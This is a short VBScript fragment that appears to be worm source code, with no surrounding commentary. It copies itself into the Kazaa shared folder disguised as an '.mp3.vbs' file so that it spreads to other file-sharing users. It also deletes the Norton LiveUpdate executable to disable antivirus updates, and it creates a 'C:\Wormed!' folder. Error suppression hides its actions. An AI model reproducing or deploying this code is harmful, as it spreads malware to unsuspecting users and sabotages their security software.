   On Error Resume Next
   Set fso = CreateObject('Scripting.FileSystemObject')
   Set dirsystem = fso.GetSpecialFolder(1)
   MyWorm = (WScript.ScriptFullName)
   Norton = ('C:\Program Files\Symantec\Live Update\LNUPDATE.EXE')
   Kazaa = ('C:\Program Files\Kazaa\My Shared Folder')& '\'
   dir = 'C:\Wormed!'
   if fso.folderexists(Kazaa) then
   fso.copyfile MyWorm, Kazaa & '.mp3.vbs'
   end if
   Set File = fso.GetFile(Norton)
   File.Delete
   fso.createfolder(dir)
